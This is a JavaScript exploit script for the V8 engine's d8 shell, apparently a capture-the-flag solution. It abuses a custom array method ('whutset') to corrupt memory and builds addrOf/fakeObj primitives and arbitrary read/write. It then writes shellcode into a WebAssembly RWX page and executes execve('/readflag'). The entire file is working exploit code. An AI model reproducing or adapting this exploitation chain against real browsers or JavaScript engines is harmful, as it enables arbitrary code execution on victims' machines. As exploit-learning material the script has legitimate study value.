/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

// d8 only
// function dp(x){ %DebugPrint(x); }
// function bp() { %SystemBreak(); }

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

/// Construct addrof primitive
var float_arr = [1.1, 1.2, 1.3, 1.4];
var obj = {"A":1};
var obj_arr = [obj, obj];

float_arr.whutset(50);

var float_arr_map = itof(ftoi(float_arr[4]) & 0xffffffffn);
console.log("[*] float_arr_map: 0x" + ftoi(float_arr_map).toString(16));
var obj_arr_map = itof(ftoi(float_arr_map) + 128n);
console.log("[*] obj_arr_map: 0x" + ftoi(obj_arr_map).toString(16));

function addrOf(obj) {
    obj_arr[0] = obj;
    float_arr[13] = itof(ftoi(float_arr_map) << 32n);
    let addr = Number(ftoi(obj_arr[0]) & 0xffffffffn);
    float_arr[13] = itof(ftoi(obj_arr_map) << 32n);
    return BigInt(addr);
}

function fakeObj(addr) {
    float_arr[12] = itof(0x4n) + itof(addr << 32n);
    float_arr[13] = itof(ftoi(obj_arr_map) << 32n);
    let fake = obj_arr[0];
    return fake;
}

var arb_rw_arr = [(itof(0x725n << 32n)) + (float_arr_map), 1.2, 1.3, 1.4];
console.log("[*] arb_rw_arr: 0x" + addrOf(arb_rw_arr).toString(16));

function arb_read(addr) {
    if (addr % 2n == 0)
        addr += 1n;

    let fake = fakeObj(addrOf(arb_rw_arr) - 0x20n);
    arb_rw_arr[1] = itof(0x8n << 32n) + itof(addr - 0x8n);
    return ftoi(fake[0]);
}

function arb_write(addr, val) {
    if (addr % 2n == 0)
        addr += 1n;

    let fake = fakeObj(addrOf(arb_rw_arr) - 0x20n);
    arb_rw_arr[1] = itof(0x8n << 32n) + itof(addr - 0x8n);
    fake[0] = itof(val);
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var wasm_trusted_data = arb_read(addrOf(wasm_instance) + 0x8n) >> 32n;
console.log("[+] trusted data: 0x" + wasm_trusted_data.toString(16));
var rwx = arb_read(wasm_trusted_data + 0x30n);
console.log("[*] rwx: 0x" + rwx.toString(16));

var shellcode = [
    0x480000000d3d8d48n,
    0x003bb8d23148f631n,
    0x6165722f050f0000n,
    0x0067616c6664n,
];

function copy(addr, data_arr) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrOf(buf);
    let backing_store_addr = buf_addr - 1n + 0x24n;
    arb_write(backing_store_addr, addr);

    for (let i = 0; i < data_arr.length; i++) {
        dataview.setBigUint64(8*i, data_arr[i], true);
    }
}

copy(rwx, shellcode);

console.log("[+] executing execve('/readflag', 0, 0)");
f();